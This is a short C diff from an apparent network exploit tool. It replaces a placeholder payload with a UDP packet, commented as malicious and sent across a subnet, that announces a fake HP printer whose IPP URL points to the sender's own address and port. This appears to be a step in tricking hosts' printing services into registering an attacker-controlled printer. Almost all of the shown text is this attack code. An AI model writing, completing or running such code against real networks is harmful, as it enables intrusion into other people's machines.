@@ -27,7 +27,9 @@ uint32_t sockaddr_to_uint32(Globals *global, struct sockaddr_in *addr) {
 
 void handle_payload(Globals *global, char buf[BUFFER_SIZE], struct sockaddr_in *addr) {
   // TODO do something with buffer and addr
+  
 }
+
 
 void receive_from(Globals *global, struct pollfd *pfds) {
   int num_events = global->poll(pfds, 1, POLL_TIMEOUT);
@@ -82,8 +84,9 @@ void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_
 
   ssize_t bytes_sent;
 
-  // TODO craft payload
-  char payload[] = "hello";
+  // Send a malicious UDP packet to the target printer
+  char *payload = global->malloc(BUFFER_SIZE);
+  global->snprintf(payload, BUFFER_SIZE, "0 3 http://%s:%d/printers/hp \"Local\" \"HPLaserJet\"", global->inet_ntoa(if_ip->sin_addr), global->ipp_server_port);
   size_t payload_size = global->strlen(payload) + 1;
 
   struct pollfd pfds[1];
